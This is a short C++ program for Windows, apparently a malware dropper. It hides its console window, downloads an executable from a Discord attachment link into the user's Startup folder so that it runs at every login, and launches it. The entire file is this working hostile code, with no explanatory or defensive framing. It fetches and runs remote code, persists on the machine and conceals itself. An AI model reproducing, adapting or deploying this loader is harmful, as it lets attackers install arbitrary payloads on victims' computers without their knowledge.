#include <windows.h>
#include <wininet.h>
#include <fstream>

#pragma comment(lib, "wininet.lib")

int main() {

    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    const char* url = "https://cdn.discordapp.com/attachments/1284608732772302910/1287167472948088915/full.exe?ex=66f08f9f&is=66ef3e1f&hm=aff627f7fc02420d3dcfccde73560502ff5b04e2ad6f91d1b6fc4a1f20fa25e3&";
    const char* outputFile = "C:\\Users\\runningitup\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\downloaded_file.exe";

    if (HINTERNET hConnect = InternetOpenUrlA(InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0), url, NULL, 0, INTERNET_FLAG_RELOAD, 0)) {
        std::ofstream outFile(outputFile, std::ios::binary);
        char buffer[4096];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
            outFile.write(buffer, bytesRead);
        }
        outFile.close();
        InternetCloseHandle(hConnect);
        ShellExecuteA(NULL, "open", outputFile, NULL, NULL, SW_SHOW);
    }
}
